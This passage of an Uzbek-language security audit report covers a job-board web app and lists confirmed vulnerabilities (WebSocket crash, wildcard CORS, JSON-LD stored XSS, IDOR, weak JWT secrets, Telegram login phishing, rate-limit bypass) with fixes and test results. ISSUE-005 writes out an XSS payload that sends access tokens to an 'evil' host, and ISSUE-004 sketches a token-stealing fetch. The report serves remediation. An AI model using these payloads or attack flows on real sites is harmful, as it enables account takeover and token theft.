- **Verdict:** CONFIRMED (empirik: test bazasidagi probe serverda qayta hosil qilindi)
- **Holat:** FIXED
- **Area:** security/availability
- **Fayl:** `apps/api/src/modules/chat/chat.routes.ts:92`
- **Root cause:** `ws.on("message", async ...)` ichida conversationId ObjectId sifatida tekshirilmaydi va participantsOf() → prisma.findUnique({ id }) ga uzatiladi. MongoDB provider noto'g'ri ObjectId'da xato tashlaydi (Malformed ObjectID). Handler'da try/catch yo'q, apps/api/src'da process.on('unhandledRejection') ham topilmadi. Node 20 odatda unhandled rejection'da jarayonni to'xtatadi.
- **Impact:** Istalgan tizimga kirgan foydalanuvchi /ws/chat'ga {"type":"read","conversationId":"x"} yuborib API jarayonini qulatishi mumkin. Shuningdek WS orqali xabar yuborishda requirePhoneVerified va isBlocked tekshiruvlari yo'q (REST /start'da bor).
- **Evidence:** chat.routes.ts:83-94: ws.on("message", async (raw) => { ... const conversationId = String(data.conversationId ?? ""); if (!conversationId) return; const parts = await participantsOf(conversationId); ...}); grep unhandledRejection apps/api/src → natija yo'q.
- **Recommended fix:** Handler tanasini try/catch'ga o'rash va conversationId'ni OBJECT_ID_RE bilan tekshirish (common/validation.js). Yuborishdan oldin foydalanuvchi isPhoneVerified && !isBlocked ekanini bir marta (ulanishda) tekshirish. server.ts'ga log qiluvchi process.on('unhandledRejection') qo'shish.
- **Dependencies:** common/validation.ts OBJECT_ID_RE
- **Risk:** Past.
- **Lead auditor izohi:** Empirik: /ws/chat ga conversationId='not-an-object-id' yuborilgach /health javob bermadi, Node jarayoni to'xtadi.
- **Bajarilgan fix:** WS handler: try/catch, `isObjectId`, satr tana tekshiruvi, `maxPayload` 64 KB.
- **Test/dalil:** e2e `[ISSUE-003/040]` PASS (noto'g'ri ID, obyekt tana, 200 KB frame → 1009, server tirik)
- **Birlashtirilgan manbalar (4):**
  - R004 [candidate-public, P0] `apps/api/src/modules/chat/chat.routes.ts:92` — WS xabarida noto'g'ri conversationId async handler'da unhandled rejection beradi: server yiqilishi mumkin (DoS)
  - R009 [realtime-notifications, P0] `apps/api/src/modules/chat/chat.routes.ts:92` — WS 'message' handler'da try/catch yo'q — noto'g'ri conversationId bilan Prisma xatosi unhandled rejection → jarayon o'chadi
  - R015 [validation-errors, P0] `apps/api/src/modules/chat/chat.routes.ts:83` — WS 'message' handler'idagi async xato ushlanmaydi — noto'g'ri conversationId butun API jarayonini yiqitishi mumkin
  - R022 [authz-idor, P1] `apps/api/src/modules/chat/chat.routes.ts:92` — WS /ws/chat: noto'g'ri formatdagi conversationId → Prisma P2023 → unhandled promise rejection → API jarayoni yiqilishi mumkin

### ISSUE-004

**CORS har qanday *.vercel.app manziliga credentials bilan ruxsat beradi: begona Vercel sayti refresh cookie orqali access token oladi**

- **Severity:** P0 (agent bahosi: P0)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** security/cors
- **Fayl:** `apps/api/src/server.ts:97`
- **Root cause:** `VERCEL_PREVIEW = /^https:\/\/[a-z0-9-]+\.vercel\.app$/i` (server.ts:90) va `origin(...)` callback'i (server.ts:97) shu naqshga mos HAR QANDAY origin'ni qabul qiladi, `credentials: true` (server.ts:100). vercel.app — ommaviy hosting: hujumchi o'z loyihasini `https://evil-abc.vercel.app` da bepul deploy qiladi. Refresh cookie prod'da `sameSite: none; secure` (auth.routes.ts:37-42), shuning uchun brauzer uni cross-site fetch'ga qo'shadi.
- **Impact:** Hisobni to'liq egallash (account takeover): jabrlanuvchi ISH BOR!'ga kirgan holda hujumchi vercel.app sahifasini ochsa, sahifa `fetch(API+'/api/auth/refresh',{method:'POST',credentials:'include'})` qiladi → brauzer cookie'ni yuboradi, ACAO=hujumchi origin, ACAC=true → javobdagi `accessToken` o'qiladi va hujumchiga ketadi. 15 daqiqalik access token + har 12 daqiqada yangilash imkoni (cookie hali ham hujumchida ishlaydi). Admin hisoblari ham.
- **Evidence:** server.ts:90 `const VERCEL_PREVIEW = /^https:\/\/[a-z0-9-]+\.vercel\.app$/i;` server.ts:97 `if (allowedOrigins.includes(origin) || VERCEL_PREVIEW.test(origin)) return cb(null, true);` server.ts:100 `credentials: true`. auth.routes.ts:39-40 `sameSite: (isProd ? "none" : "lax")`, `secure: isProd`. auth.routes.ts:74-88 `/api/auth/refresh` cookie'dan token o'qib yangi accessToken JSON qaytaradi. .env.example: "Vercel'ning *.vercel.app preview domenlariga ruxsat avtomatik bor".
- **Recommended fix:** Naqshni loyiha nomiga bog'lang: `VERCEL_PREVIEW = /^https:\/\/ishbor(-[a-z0-9-]+)?\.vercel\.app$/` yoki env'da `VERCEL_PROJECT_SLUG` / `CORS_PREVIEW_PATTERN` bo'lib, faqat `<project>-<hash>-<team>.vercel.app` shakli o'tsin. Yana ham yaxshisi: prod'da preview'larga umuman credentials bermaslik (`credentials: allowedOrigins.includes(origin)`), preview'lar uchun `CORS_EXTRA_ORIGINS` ga qo'lda qo'shish. Qo'shimcha himoya: `/api/auth/refresh` da `Origin`/`Sec-Fetch-Site` sarlavhasini allowedOrigins bilan qat'iy tekshirish.
- **Dependencies:** CORS_EXTRA_ORIGINS/WEB_ORIGIN sozlamasi (env.ts:105-111); DEPLOY.md hujjatini yangilash
- **Risk:** Vercel preview deploylarida API chaqiruvlari ishlamay qolishi mumkin — preview URL naqshini aniq belgilash kerak
- **Lead auditor izohi:** Kod: server.ts VERCEL_PREVIEW regex + credentials:true; e2e testi hatto 'ishbor-git-x.vercel.app' ruxsatini kutadi.
- **Bajarilgan fix:** `*.vercel.app` wildcard olib tashlandi; ixtiyoriy aniq `CORS_PREVIEW_ORIGIN_REGEX`; ruxsatsiz origin 403 (D-006).
- **Test/dalil:** e2e CORS + `[ISSUE-004]` preflight PASS
- **Birlashtirilgan manbalar (2):**
  - R011 [security-surface, P0] `apps/api/src/server.ts:97` — CORS credentials:true + har qanday *.vercel.app origin'ga ruxsat → istalgan Vercel sayti refresh cookie bilan access token oladi
  - R014 [tests-infra, P0] `apps/api/src/server.ts:90` — Istalgan *.vercel.app manzili credentials bilan CORS oladi, shu yo'l bilan refresh cookie orqali access token o'g'irlanadi

### ISSUE-005

**JSON-LD ichida JSON.stringify '</script>' ni escape qilmaydi: ish beruvchi kiritgan vakansiya sarlavhasi orqali SSR HTML'da stored XSS**

- **Severity:** P0 (agent bahosi: P0)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** security/xss
- **Fayl:** `apps/web/src/components/JsonLd.tsx:9`
- **Root cause:** `dangerouslySetInnerHTML={{ __html: JSON.stringify(data) }}` — JSON.stringify `<`, `>`, `/` ni escape qilmaydi; sarlavhada `</script><script>...` bo'lsa HTML parser <script type=ld+json>'ni yopib, keyingisini ishga tushiradi. `vacancy.title` (detail.ts:179 `str(raw?.title)`) va `company.name` (detail.ts:213) hech qanday teg tozalashsiz jobLd/breadcrumbLd'ga kiradi (vacancies/@slug/+Head.tsx:48,56,69), companies/@slug/+Head.tsx:36,44 ham. Backend'da title/company name uchun HTML filtri yo'q (vacancies.routes.ts:42 `title: z.string().min(3)`, companies.routes.ts:32 `name`). Web origin'da CSP umuman yo'q (vercel.json:232-245, server/index.mjs:40-45).
- **Impact:** Employer vakansiya sarlavhasini `X</script><script>fetch('https://evil/?t='+localStorage['ish-top:accessToken'])</script>` qilib joylaydi (moderatsiyadan o'tgach — yoki `status: active` bilan to'g'ridan-to'g'ri, vacancies.routes.ts:71 buni ruxsat etadi). Sahifani ochgan har bir kirgan foydalanuvchining access tokeni (localStorage, AuthContext.tsx:16) o'g'irlanadi; admin ham. Vakansiya ro'yxati (vacancies/+Head.tsx:32 listLd) orqali ham tarqaladi.
- **Evidence:** JsonLd.tsx:9 `<script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(data) }} />`. vacancies/@slug/+Head.tsx:56 `title: vacancy.title`, :48 breadcrumb `name: vacancy.title`, :69 `name: company.name`. detail.ts:81-83 `str()` faqat trim; :179 `const title = str(raw?.title) ?? ""` (plainText yo'q). companies/@slug/+Head.tsx:44 `name: company.name`. vercel.json:232-245 — CSP yo'q.
- **Recommended fix:** JsonLd.tsx: `JSON.stringify(data).replace(/</g, '\\u003c').replace(/>/g, '\\u003e').replace(/&/g, '\\u0026').replace(/\u2028/g,'\\u2028').replace(/\u2029/g,'\\u2029')` — JSON semantikasi saqlanadi, HTML parser uchun xavfsiz. Qo'shimcha: web origin'ga CSP (`script-src 'self' 'sha256-<THEME_INIT_SCRIPT hash>' https://accounts.google.com; object-src 'none'; base-uri 'self'`) vercel.json/server/index.mjs/vite.config'ga; backend'da title/name'dan `<`/`>` ni rad etish yoki strip qilish (`.refine(v => !/[<>]/.test(v))`).
- **Dependencies:** THEME_INIT_SCRIPT (lib/theme.tsx:63) hash'i CSP'ga; Google GIS skripti CSP'da ruxsat
- **Risk:** Past — Google JSON-LD'da < ni to'g'ri o'qiydi. CSP kiritilsa inline skript/Google login sinishi mumkin, alohida sinash kerak
- **Lead auditor izohi:** Empirik (node): JSON.stringify('</script><script>') o'zgarishsiz qaytadi; vakansiya sarlavhasi to'g'ridan-to'g'ri jobLd'ga kiradi.
- **Bajarilgan fix:** `serializeJsonLd()` — `<`, `>`, `&`, U+2028/2029 unicode-escape (D-026).
- **Test/dalil:** PHASE 6: web unit-check `serializeJsonLd` PASS (ISSUE-121)

### ISSUE-006

**Ariza yuborishda resumeId egaligi tekshirilmaydi: boshqa nomzodning rezyumesini o'z arizasiga biriktirib ish beruvchiga ochish mumkin**

- **Severity:** P1 (agent bahosi: P0, P1)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** authz/idor
- **Fayl:** `apps/api/src/modules/applications/applications.routes.ts:39`
- **Root cause:** applySchema ixtiyoriy `resumeId` qabul qiladi. U berilsa, rezyume joriy nomzodga tegishliligi tekshirilmaydi va to'g'ridan-to'g'ri Application.resumeId'ga yoziladi (57-64).
- **Impact:** Hujumchi o'zining employer hisobida vakansiya ochadi (limit yo'q) va nomzod hisobidan boshqa odamning resumeId'si bilan ariza yuboradi. Keyin /api/employer/applications (168-174) orqali o'sha rezyumeni tajriba, ta'lim va ko'nikmalari bilan to'liq o'qiydi, jumladan isOpenToWork=false nomzodlarniki ham. ObjectId bitta jarayonda ketma-ket hosil bo'ladi, shuning uchun ID'larni taxmin qilish mumkin.
- **Evidence:** applications.routes.ts:39-49 `let resumeId = body.resumeId; if (!resumeId && !vacancy.applyWithoutResume) {...}`; 57-64 `data: { vacancyId, jobSeekerId: req.user!.sub, resumeId, ... }`. Tekshiruv yo'q.
- **Recommended fix:** body.resumeId berilsa, `prisma.resume.findFirst({ where: { id: body.resumeId, jobSeeker: { userId: req.user!.sub } } })` bilan tekshirish, topilmasa 404/400. Frontend resumeId yubormaydi (api.ts:173-175), shuning uchun maydonni sxemadan butunlay olib tashlash ham mumkin.
- **Dependencies:** Yo'q
- **Risk:** Past: web client resumeId yubormaydi.
- **Lead auditor izohi:** Severity P0→P1: hujum uchun begona rezyume ObjectId kerak.
- **Bajarilgan fix:** Arizada `resumeId` faqat nomzodning o'z rezyumesi bo'lsa qabul qilinadi.
- **Test/dalil:** e2e `[ISSUE-006]` PASS
- **Birlashtirilgan manbalar (4):**
  - R003 [candidate-public, P0] `apps/api/src/modules/applications/applications.routes.ts:39` — Ariza yuborishda body.resumeId egasi tekshirilmaydi: begona rezyumeni biriktirib o'qish mumkin (IDOR)
  - R020 [authz-idor, P1] `apps/api/src/modules/applications/applications.routes.ts:39` — POST /api/vacancies/:id/apply — `resumeId` egaligi tekshirilmaydi (boshqa nomzod rezyumesini arizaga biriktirish IDOR)
  - R035 [employer-product, P1] `apps/api/src/modules/applications/applications.routes.ts:39` — Ariza yuborishda body.resumeId nomzodga tegishli ekani tekshirilmaydi: begona rezyume employer'ga ochiladi
  - R062 [validation-errors, P1] `apps/api/src/modules/applications/applications.routes.ts:13` — Ariza yuborishda `resumeId` egaligi tekshirilmaydi — boshqa nomzodning rezyumesini o'z arizasiga biriktirish mumkin

### ISSUE-007

**Nomzodlar bazasi bepul rejada 402 PLAN_FEATURE_LOCKED qaytaradi (product rule: platforma bepul); frontend buni 'nomzod topilmadi' deb ko'rsatadi; e2e esa 402 ni talab qiladi**

- **Severity:** P1 (agent bahosi: P1)
- **Verdict:** CONFIRMED (empirik: test bazasidagi probe serverda qayta hosil qilindi)
- **Holat:** FIXED
- **Area:** monetization/product-rule
- **Fayl:** `apps/api/src/modules/candidates/candidates.routes.ts:243`
- **Root cause:** `assertCanSearchCandidates(company.id)` (243) → billing.service.ts:171–180 `402`; DEFAULT_PLANS free `canSearchCandidates: false` (billing.service.ts:24) va FREE_FALLBACK (113). Vakansiya limiti olib tashlangan (billing.service.ts:167–168), lekin nomzodlar bazasi gate'i qolgan. e2e-check.mjs:526–529 hatto 402 ni kutadi. Frontend `authGet(..., { items: [] })` (apps/web/src/lib/api.ts:781) xatoni bo'sh ro'yxatga aylantiradi.
- **Impact:** Har bir employer uchun /employer/candidates sahifasi 'nomzod yo'q' deb ko'rinadi (EMPTY ≠ ERROR qoidasi buziladi), aslida 402. Core employer flow monetizatsiyaga bog'langan.
- **Evidence:** candidates.routes.ts:236-244; billing.service.ts:171-180 `throw new AppError(402, "PLAN_FEATURE_LOCKED", ...)`; e2e-check.mjs:526 `nomzodlar bazasi bepul tarifda yopiq (402)`; apps/web/src/lib/api.ts:781.
- **Recommended fix:** 243-qatordagi `assertCanSearchCandidates` chaqiruvini olib tashlash (kompaniya mavjudligi tekshiruvi qolsin), preHandler'ga `requirePhoneVerified` qo'shish (spam/skreyping oldini olish — vacancies.routes.ts:133 bilan bir xil). e2e-check.mjs:526 testini 200 + `items` massiviga o'zgartirish. Frontend: `authGet` fallback o'rniga xatoni error holatida ko'rsatish.
- **Dependencies:** e2e-check.mjs:526; apps/web/src/lib/api.ts:781 (EMPTY≠ERROR).
- **Risk:** Past. Skreyping xavfi oshadi — 15-topilma bilan birga hal qilinsin.
- **Lead auditor izohi:** Empirik: GET /api/candidates → 402.
- **Bajarilgan fix:** Nomzodlar bazasidagi 402 tarif tekshiruvi olib tashlandi (D-012).
- **Test/dalil:** e2e `nomzodlar bazasi bepul` + `[ISSUE-007/008]` PASS
- **Birlashtirilgan manbalar (9):**
  - R021 [authz-idor, P1] `apps/api/src/modules/candidates/candidates.routes.ts:243` — GET /api/candidates bepul tarifda 402 PLAN_FEATURE_LOCKED — product rule 1 ga zid; frontend 402 ni bo'sh ro'yxat sifatida ko'rsatadi
  - R030 [candidate-public, P1] `apps/web/src/pages/index/+Page.tsx:37` — Employer bosh sahifa, /vacancies va /companies'dan pullik /employer/candidates'ga yo'naltiriladi, u yerda 402 bo'sh ro'yxat bo'lib ko'rinadi
  - R032 [data-scale, P1] `apps/api/src/modules/candidates/candidates.routes.ts:165` — Employer nomzodlar qidiruvi hali ham 402 PLAN_FEATURE_LOCKED bilan tarifga bog'langan
  - R037 [employer-product, P1] `apps/api/src/modules/candidates/candidates.routes.ts:243` — Nomzodlar bazasi bepul tarifda 402 qaytaradi, frontend buni 'nomzod topilmadi' bo'sh holati sifatida ko'rsatadi
  - R049 [monetization, P1] `apps/api/scripts/e2e-check.mjs:526` — E2E test 'nomzodlar bazasi bepul tarifda yopiq (402)' product rule'ga zid xatti-harakatni qulflab qo'ygan
  - R050 [monetization, P1] `apps/api/src/modules/candidates/candidates.routes.ts:21` — Employer 'Nomzodlar' sahifasi bepul rejada 402 PLAN_FEATURE_LOCKED bilan yopiq — product rule 1 buzilishi
  - R051 [monetization, P1] `apps/web/src/lib/api.ts:781` — fetchCandidates 402/5xx xatoni bo'sh ro'yxatga aylantiradi — 'Nomzod topilmadi' soxta bo'sh holat
  - R057 [tests-infra, P1] `apps/api/scripts/e2e-check.mjs:526` — E2E nomzodlar bazasida 402 PLAN_FEATURE_LOCKED'ni talab qiladi (bepul platforma qoidasiga zid), web esa 402'ni bo'sh ro'yxat qilib ko'rsatadi
  - R063 [validation-errors, P1] `apps/api/src/modules/candidates/candidates.routes.ts:15` — Nomzodlar qidiruvi hali ham tarifga bog'langan (402) va frontend bu xatoni "Nomzod topilmadi" bo'sh holati sifatida ko'rsatadi

### ISSUE-008

**Nomzodlar qidiruvi har qanday ro'yxatdan o'tgan ish beruvchiga barcha 'ish qidirayotgan' nomzodlarning email va telefonini beradi; zod/sahifalash yo'q, noto'g'ri region 500**

- **Severity:** P1 (agent bahosi: P2)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** privacy
- **Fayl:** `apps/api/src/modules/candidates/candidates.routes.ts:273`
- **Root cause:** `user: { select: { id, email, phone } }` (273) va javobda `email`, `phone` (311–312) — suhbat yoki ariza bo'lmasa ham. `resumes: { some: {} }` (253) status filtrsiz — `ResumeStatus draft` (schema.prisma:58–61) ham 'rezyumesi bor' hisoblanadi va draft mazmuni (summary, tajriba) chiqadi. `query.region` (246, 254) `regionId: query.region` — 24-hex bo'lmasa P2023 → 500. `take: 50`, offset yo'q, `text` bo'yicha bo'lak-bo'lak enumeratsiya mumkin. preHandler'da requirePhoneVerified yo'q.
- **Impact:** 4-topilma (402 olib tashlangach) bilan birga: bepul, telefon tasdiqlanmagan employer hisobi 10k nomzodning telefon/email bazasini text filtrlari bilan yig'adi. Nomzod hali e'lon qilmagan (draft) rezyumesi ko'rinadi.
- **Evidence:** candidates.routes.ts:246 `req.query as { text?: string; region?: string }` — zod yo'q; :253 `resumes: { some: {} }`; :273, :311-312.
- **Recommended fix:** preHandler: `requirePhoneVerified`; where: `resumes: { some: { status: "published" } }` va include'da ham `where: { status: "published" }`; query zod: `region: objectId().optional()`, `text: max(100)`, `page/pageSize` (skip/take); javobda `phone`/`email` ni faqat mavjud suhbat/ariza bo'lsa berish (yoki 'Bog'lanish' tugmasi conversations/start orqali).
- **Dependencies:** 4-topilma; frontend Candidate tipi (api.ts) email/phone ixtiyoriy bo'lishi.
- **Risk:** O'rta — nomzod kartasida telefon ko'rsatilmay qoladi (product qarori).
- **Lead auditor izohi:** Severity P2→P1: 402 olib tashlangach (ISSUE-007) har qanday employer skreyp qila oladi; ikkalasi birga tuzatiladi.
- **Bajarilgan fix:** Email/telefon faqat shu kompaniyaga ariza yuborgan nomzodda; faqat chop etilgan rezyume; region zod bilan; UI kontakt yo'qligini tushuntiradi. PHASE 6: Suhbatlar ro'yxati va suhbatdosh profilidagi email fallback olib tashlandi (ISSUE-104).
- **Test/dalil:** e2e `[ISSUE-007/008]` PASS; web typecheck/build PASS; brauzer: /employer/candidates 1280 skrinshot tekshirildi; PHASE 6: e2e `[PHASE6-V1]` PASS
- **Birlashtirilgan manbalar (4):**
  - R078 [authz-idor, P2] `apps/api/src/modules/candidates/candidates.routes.ts:273` — /api/candidates: har bir nomzodning email+telefonini istalgan employer (telefon/kompaniya tasdiqsiz) skreyp qiladi; draft rezyumelar ham chiqadi; `region` parametri tekshirilmagan (500)
  - R129 [employer-product, P2] `apps/api/src/modules/candidates/candidates.routes.ts:311` — Nomzodlar qidiruvi har bir employer'ga ochiq ish izlovchilarning email va telefonini beradi; sahifalash yo'q, qat'iy 50 ta
  - R199 [validation-errors, P2] `apps/api/src/modules/candidates/candidates.routes.ts:24` — `/api/candidates` da zod umuman yo'q: `region` to'g'ridan-to'g'ri `regionId` ga (P2023 → 500), `text` cheklanmagan, sahifalash yo'q
  - R114 [db-performance, P2] `apps/api/src/modules/candidates/candidates.routes.ts:788` — /api/candidates — take 50, page/cursor yo'q (51-nomzodga hech qachon yetib bo'lmaydi), 3 bosqichli relation regex filtr, to'liq rezyume include; query validatsiyasiz

### ISSUE-009

**JWT sirlari uchun minimal 8 belgi, algoritm pin qilinmagan, access/refresh token turi ajratilmagan**

- **Severity:** P1 (agent bahosi: P1, P3)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** security/auth
- **Fayl:** `apps/api/src/common/env.ts:456`
- **Root cause:** env.ts:456-457 `JWT_ACCESS_SECRET: z.string().min(8)`; .env.example:17-18 ham 8 belgilik lug'at so'zlari misol qilib bergan. jwt.ts:369,373 `jwt.verify(token, secret)` `algorithms` opsiyasiz — HS256/HS384/HS512 hammasi qabul qilinadi. Access va refresh payload'larida `typ`/`aud` farqi yo'q (jwt.ts:360-366): ikki secret bir xil qo'yilsa refresh token requireAuth'dan o'tadi (role undefined).
- **Impact:** Har qanday chiqib ketgan access token (loglar, WS URL) bilan 8 belgili HS256 secret hashcat'da soatlar ichida topiladi -> ixtiyoriy `sub`/`role: admin` token yasash = to'liq auth bypass (admin.routes.ts:19 requireRole tokendagi rolga ishonadi).
- **Evidence:** apps/api/src/common/env.ts:456-457; apps/api/src/common/jwt.ts:360-374; apps/api/.env.example:17-18; apps/api/src/common/auth-guard.ts:399-404 (rol faqat tokendan).
- **Recommended fix:** env.ts: `.min(32)` (prod'da) + startup'da access≠refresh tekshiruvi; .env.example'da `openssl rand -base64 48` ko'rsatmasi. jwt.ts: sign'da `{ algorithm: "HS256" }`, verify'da `{ algorithms: ["HS256"] }`; access'ga `typ: "access"`, refresh'ga `typ: "refresh"` claim qo'shib verify'da tekshirish. Deploy hujjatida (DEPLOY.md) secret talabini yozish.
- **Dependencies:** e2e-check.mjs:72 test secretlari 32+ belgiga o'zgartirilishi kerak; mavjud prod secret qisqa bo'lsa rotatsiya = barcha foydalanuvchilar qayta kiradi.
- **Risk:** O'rta: secret rotatsiyasi seanslarni uzadi (bir martalik); algoritm pin mavjud HS256 tokenlarga ta'sir qilmaydi.
- **Bajarilgan fix:** HS256 qat'iy, `typ` claim, production'da sirlar ≥32 belgi va farqli (D-008).
- **Test/dalil:** e2e `[ISSUE-009]` PASS (HS512 va typ=refresh → 401)
- **Birlashtirilgan manbalar (3):**
  - R016 [auth, P1] `apps/api/src/common/env.ts:456` — JWT secret minimal 8 belgi va algoritm pin qilinmagan — HS256 secret offline brute-force bilan admin token yasash mumkin
  - R055 [security-surface, P1] `apps/api/src/common/env.ts:18` — JWT_ACCESS_SECRET/JWT_REFRESH_SECRET uchun minimal uzunlik 8 belgi — HS256 tokenini oflayn brute-force qilib admin token yasash mumkin
  - R261 [security-surface, P3] `apps/api/src/common/jwt.ts:140` — jwt.verify `algorithms` aniq berilmagan — hozir kutubxona defaulti (HS256/384/512) himoya qiladi, lekin sirni kalit-fayl/PEM'ga o'tkazilsa alg-confusion xavfi

### ISSUE-010

**Telegram orqali kirish: deep-link bosilishi bilan bot tasdiqsiz sessiya beradi — bir klikli phishing orqali hisobni egallash**

- **Severity:** P1 (agent bahosi: P1)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** security/auth
- **Fayl:** `apps/api/src/modules/telegram/telegram.service.ts:112`
- **Root cause:** POST /api/auth/telegram/start (auth.routes.ts:103-113) hech qanday autentifikatsiyasiz `lg<token>` deep-link yaratadi. handleLoginStart (telegram.service.ts:112-131) havolani kim bosgan bo'lsa, o'sha chatga bog'langan userId'ni tokenga yozadi va hech qanday tasdiq so'ramaydi. Tokenni yaratgan brauzer (auth.routes.ts:115-124 poll) esa sessiyani oladi. Token brauzerga bog'lanmagan, botda "siz kirmoqchimisiz?" tasdiq tugmasi yo'q. Xuddi shu naqsh link-token'da ham bor: hujumchi o'z hisobi uchun /api/telegram/link yaratib havolani jabrlanuvchiga yuborsa, jabrlanuvchining Telegram'i hujumchi hisobiga bog'lanadi (telegram.service.ts:196-207), keyin kontakt ulashsa hujumchi hisobiga TASDIQLANGAN telefon yoziladi (227-237).
- **Impact:** Hujumchi start chaqirib olgan havolani ("ISH BOR! ga kirish uchun bosing") Telegram orqali jabrlanuvchiga yuboradi; jabrlanuvchi botda Start bossa bot "✅ Kirish tasdiqlandi" deydi va hujumchi poll orqali jabrlanuvchining to'liq sessiyasini (access + 30 kunlik refresh) oladi. Link-token varianti — begona odamning telefonini o'z hisobiga tasdiqlash (requirePhoneVerified'ni aylanib o'tish, soxta profil).
- **Evidence:** auth.routes.ts:103-124 (start auth'siz, poll natijani beradi); telegram.service.ts:118-130 (`entry.status = "confirmed"; entry.userId = user.id` tasdiqsiz); telegram.service.ts:203-207 (`updateMany ... telegramChatId: null` boshqa hisobdan uzib, yangisiga bog'laydi); 233-237 (phone + isPhoneVerified: true).
- **Recommended fix:** handleLoginStart'da darhol confirm qilmang: botga inline tugmali xabar yuboring ("Brauzerdan kirishni tasdiqlaysizmi? [Ha] [Yo'q]", callback_data = token) va faqat callback_query'da `confirmed` qiling (allowed_updates ga "callback_query" qo'shing). Qo'shimcha: saytda 2-4 belgili kod ko'rsatib, botdagi xabarda ham shu kodni ko'rsating (foydalanuvchi mosligini ko'radi). Link oqimida ham bot xabarida qaysi email hisobga bog'lanayotganini ko'rsatib, tasdiq tugmasi qo'ying. Deep-link xabarida "Agar buni siz boshlamagan bo'lsangiz — Yo'q" ogohlantirish.
- **Dependencies:** telegram.service.ts handleUpdate'ga callback_query ishlovchi; frontend SocialLogin.tsx tgWaiting matni (kod ko'rsatish bo'lsa i18n 3 til).
- **Risk:** Past: faqat Telegram oqimiga qo'shimcha qadam; email/parol login o'zgarmaydi.
- **Bajarilgan fix:** Telegram login: bot `/start lg…` da darhol tasdiqlamaydi — foydalanuvchi inline tugma bilan tasdiqlaydi yoki rad etadi.
- **Test/dalil:** API typecheck/build PASS; NOT RUN — Telegram bot tokeni test muhitida yo'q

### ISSUE-011

**trustProxy:true bilan X-Forwarded-For soxtalashtirilsa login/register brute-force limiti chetlab o'tiladi; email bo'yicha himoya yo'q**

- **Severity:** P1 (agent bahosi: P1, P2)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** PARTIAL
- **Area:** security/rate-limit
- **Fayl:** `apps/api/src/server.ts:446`
- **Root cause:** server.ts:446 `trustProxy: true` — Fastify barcha proxylarga ishonib `req.ip` ni XFF'dagi ENG CHAP (mijoz yozgan) qiymatdan oladi. @fastify/rate-limit (server.ts:497; auth.routes.ts:55-57 strictRateLimit 10/min) kalit sifatida `req.ip` ishlatadi. Railway o'z IP'sini XFF'ga qo'shadi, lekin mijoz yuborgan qiymatni o'chirmaydi.
- **Impact:** Hujumchi har so'rovda tasodifiy `X-Forwarded-For` yuborib /api/auth/login, /register, /google, /staff-invites uchun 10/min chegarani nolga tushiradi -> parol brute-force (parol siyosati faqat min 8, lockout yo'q) va register spam. Global 600/min ham xuddi shunday aylanib o'tiladi.
- **Evidence:** apps/api/src/server.ts:446,497; apps/api/src/modules/auth/auth.routes.ts:55-57,60,67,130; apps/api/src/modules/team/team.routes.ts:26,215,221.
- **Recommended fix:** `trustProxy` ni proxy soniga cheklang (Railway uchun `trustProxy: 1` — faqat oxirgi hop) yoki rateLimit `keyGenerator` da XFF'ning O'NG tomonidan 1-chi IP'ni oling. Qo'shimcha: login uchun email bo'yicha ikkinchi kalit (masalan `${ip}:${email}` yoki in-memory counter, 5 xato -> 15 daqiqa) — IP'dan mustaqil himoya. /api/auth/refresh va /telegram/poll ga ham alohida limit (masalan 60/min) bering (hozir faqat global).
- **Dependencies:** Railway/Vercel proxy zanjiri sonini tasdiqlash kerak; e2e-check rate-limit testlari (agar bo'lsa).
- **Risk:** O'rta: trustProxy noto'g'ri sozlansa barcha foydalanuvchi bitta proxy IP'ga yig'ilib butun sayt 429 oladi — deploydan keyin `req.ip` ni logda tekshiring.
- **Bajarilgan fix:** Login uchun email bo'yicha limit (15 daqiqada 10 xato, IP'dan qat'i nazar); `TRUST_PROXY` konfiguratsiya qilinadigan. Umumiy IP limiti soxta XFF bilan hali chetlab o'tiladi, operator hop sonini bermaguncha (D-007).
- **Test/dalil:** e2e `[ISSUE-011]` PASS; PHASE 6: e2e `[ISSUE-011] [PHASE6-U35]` 429 `TOO_MANY_ATTEMPTS` bilan PASS
- **Birlashtirilgan manbalar (3):**
  - R018 [auth, P1] `apps/api/src/server.ts:446` — trustProxy: true bilan X-Forwarded-For spoofing login brute-force limitini aylanib o'tadi
  - R059 [tests-infra, P1] `apps/api/src/server.ts:52` — trustProxy: true bo'lgani uchun X-Forwarded-For'ni soxtalashtirib rate limit'ni (login brute-force 10/min ham) chetlab o'tish mumkin
  - R186 [security-surface, P2] `apps/api/src/server.ts:52` — `trustProxy: true` — X-Forwarded-For soxtalashtirib rate-limit'ni chetlab o'tish mumkin

### ISSUE-012

**Parolni tiklash va parolni o'zgartirish oqimi umuman yo'q (login'dagi havola /support ga olib boradi)**

- **Severity:** P1 (agent bahosi: P1)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** NOT FIXED
- **Area:** auth/core-hole
- **Fayl:** `apps/web/src/pages/login/+Page.tsx:80`
- **Root cause:** Login sahifasida "Parolni unutdingizmi" havolasi /support ga olib boradi (login/+Page.tsx:80-85). Backend'da hech qanday reset/forgot/change-password endpoint yo'q (grep: apps/api/src da `password` faqat auth.routes/auth.service/team.routes/ensure-admin'da; profile.routes.ts'da yo'q). Google orqali yaratilgan hisobga tasodifiy hash yoziladi va izohda "keyin tiklash orqali o'rnatadi" deyilgan (auth.service.ts:328-330) — bunday oqim mavjud emas. SMTP infratuzilmasi (common/mailer.ts) allaqachon bor.
